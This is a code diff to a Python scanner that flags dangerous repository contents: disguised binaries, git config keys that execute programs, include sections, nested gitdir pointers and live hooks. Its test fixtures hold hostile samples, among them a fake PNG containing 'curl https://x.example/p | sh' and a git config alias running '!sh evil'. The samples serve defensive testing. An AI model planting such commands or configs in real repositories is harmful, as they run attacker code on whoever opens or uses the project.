@@ -39,10 +39,14 @@ SKIP_DIRS = {".git", "node_modules", ".venv", "venv", "__pycache__"}
 BINARY_MAGIC = {b"\x7fELF": "ELF", b"\xcf\xfa\xed\xfe": "Mach-O", b"\xca\xfe\xba\xbe": "Mach-O fat",
                 b"MZ": "Windows PE"}
 MAX_BYTES = 2_000_000
-MEDIA_EXTS = {".png", ".jpg", ".jpeg", ".gif", ".ico", ".webp", ".pdf", ".woff", ".woff2", ".ttf", ".mp4"}
-# git config keys that make git run a program (fire on plain `git status` for some).
-GIT_EXEC = re.compile(r"^\s*(fsmonitor|hookspath|sshcommand|pager|editor|askpass|textconv|clean|smudge"
-                      r"|process|path)\s*=|^\s*\[\s*include|=\s*!", re.I | re.M)
+# Skip a binary only when its real header matches its extension, so `evil.png` full of script still gets scanned.
+MEDIA_MAGIC = {".png": b"\x89PNG", ".jpg": b"\xff\xd8\xff", ".jpeg": b"\xff\xd8\xff", ".gif": b"GIF8",
+               ".pdf": b"%PDF", ".ico": b"\x00\x00\x01\x00", ".webp": b"RIFF", ".woff": b"wOFF",
+               ".woff2": b"wOF2", ".ttf": b"\x00\x01\x00\x00", ".DS_Store": b"\x00\x00\x00\x01Bud1"}
+# git config keys that make git run a program (some fire on a plain `git status`).
+GIT_EXEC_KEY = re.compile(r"^(fsmonitor|hookspath|sshcommand|pager|editor|askpass|textconv|clean|smudge"
+                          r"|process|helper|program|cmd)\s*=|=\s*\"?!", re.I)
+GIT_SECTION = re.compile(r"^\s*\[([^\]]*)\]\s*")
 
 
 def clean(s):
@@ -74,7 +78,9 @@ def scan_file(root, path):
             return [("HIGH", "binary", rel, f"prebuilt {kind} executable; you can't read what it does")]
     out = []
     if b"\0" in data[:4096]:
-        if os.path.splitext(path)[1].lower() in MEDIA_EXTS or path.endswith(".DS_Store"):
+        name = os.path.basename(path)
+        magic = MEDIA_MAGIC.get(name if name == ".DS_Store" else os.path.splitext(name)[1].lower())
+        if magic and data.startswith(magic):
             return []
         out.append(("MEDIUM", "opaque-file", rel, "binary data of unknown type; strings scanned anyway"))
     text = data.decode("utf-8", errors="ignore")
@@ -92,21 +98,50 @@ def scan_file(root, path):
     return out
 
 
+def scan_git_config(rel, text):
+    """Flag config entries that make git execute something. Parses roughly like git:
+    joins `\\` continuations and allows `[section] key = v` on one line."""
+    out, n, buf, start = [], 0, "", 1
+    for n, raw in enumerate(text.split("\n"), 1):
+        if not buf:
+            start = n
+        if raw.rstrip().endswith("\\"):
+            buf += raw.rstrip()[:-1]
+            continue
+        line, buf = buf + raw, ""
+        while (m := GIT_SECTION.match(line)):
+            if m.group(1).strip().lower().startswith("include"):
+                out.append(("HIGH", "git-config-exec", f"{rel}:{start}", "includes another config file git will obey"))
+            line = line[m.end():]
+        if GIT_EXEC_KEY.search(line.strip()):
+            out.append(("HIGH", "git-config-exec", f"{rel}:{start}", f"git will run: {line.strip()!r}"))
+    return out
+
+
+def scan_git(root, gitpath):
+    rel = os.path.relpath(gitpath, root)
+    if os.path.isfile(gitpath):  # `gitdir: <elsewhere>` pointer: hooks/config live outside what we can see
+        return [("HIGH", "git-pointer", rel, "points git at a directory outside this repo; inspect by hand")]
+    out = []
+    hooks = os.path.join(gitpath, "hooks")
+    if os.path.isdir(hooks):  # a shipped .git with live hooks runs on your next git command
+        out += [("HIGH", "git-hook", f"{rel}/hooks/{h}", "runs automatically on git commands")
+                for h in os.listdir(hooks) if not h.endswith(".sample")]
+    for cfg in ("config", "config.worktree"):
+        try:
+            with open(os.path.join(gitpath, cfg), encoding="utf-8", errors="ignore") as f:
+                out += scan_git_config(f"{rel}/{cfg}", f.read())
+        except OSError:
+            pass
+    return out
+
+
 def scan(root):
     findings = []
-    hooks = os.path.join(root, ".git", "hooks")
-    if os.path.isdir(hooks):  # a shipped .git with live hooks runs on your next git command
-        findings += [("HIGH", "git-hook", f".git/hooks/{h}", "runs automatically on git commands")
-                     for h in os.listdir(hooks) if not h.endswith(".sample")]
-    try:
-        with open(os.path.join(root, ".git", "config"), encoding="utf-8", errors="ignore") as f:
-            cfg = f.read()
-    except OSError:
-        cfg = ""
-    for n, line in enumerate(cfg.split("\n"), 1):
-        if GIT_EXEC.search(line):
-            findings.append(("HIGH", "git-config-exec", f".git/config:{n}", f"git will run: {line.strip()!r}"))
     for dirpath, dirs, files in os.walk(root):
+        if ".git" in dirs or ".git" in files:  # root repo and any nested one
+            findings += scan_git(root, os.path.join(dirpath, ".git"))
+        files = [f for f in files if f != ".git"]
         found = SKIP_DIRS & set(dirs)
         if "node_modules" in found:
             findings.append(("MEDIUM", "vendored-deps", os.path.relpath(os.path.join(dirpath, "node_modules"), root),
@@ -143,7 +178,11 @@ def test():
             "trojan.py": "access = 'user' # \u202e admin\n",
         }
         os.makedirs(os.path.join(d, ".git"))
-        files[".git/config"] = "[core]\n\tfsmonitor = ./run.sh\n[user]\n\tname = x\n"
+        files[".git/config"] = ("[core] fsmonitor = ./run.sh\n[user]\n\tname = x\n"
+                                 "[alias]\n\tx = \\\n  \"!sh evil\"\n[include]\n\tp = 1\n")
+        os.makedirs(os.path.join(d, "sub"))
+        files["sub/.git"] = "gitdir: /somewhere/else\n"
+        files["fake.png"] = "\0\0curl https://x.example/p | sh\n"
         for name, body in files.items():
             with open(os.path.join(d, name), "w") as f:
                 f.write(body)
@@ -153,11 +192,12 @@ def test():
                          ("decode-exec", "steal.js"), ("npm-install-hook", "package.json"),
                          ("binary", "tool"), ("hidden-unicode", "trojan.py"),
                          ("pipe-to-shell", "straddle.sh"), ("pipe-to-shell", "blob.dat"),
-                         ("git-config-exec", ".git/config")]:
+                         ("git-config-exec", ".git/config"),
+                         ("git-pointer", "sub/.git"), ("pipe-to-shell", "fake.png")]:
             assert expected in ids, (expected, ids)
         assert not any(where == "clean.py" for _, where in ids), ids
         assert not any(rid == "npm-install-hook" and "jest" in why for _, rid, _, why in scan(d))
-        assert sum(f[1] == "git-config-exec" for f in scan(d)) == 1  # "name = x" must not match
+        assert sum(f[1] == "git-config-exec" for f in scan(d)) == 3  # one-line, continued, include; not "name = x"
     assert "\x1b" not in clean("evil\x1b[2J.sh") and "\\x1b" in clean("evil\x1b[2J.sh")
     print("ok")
 
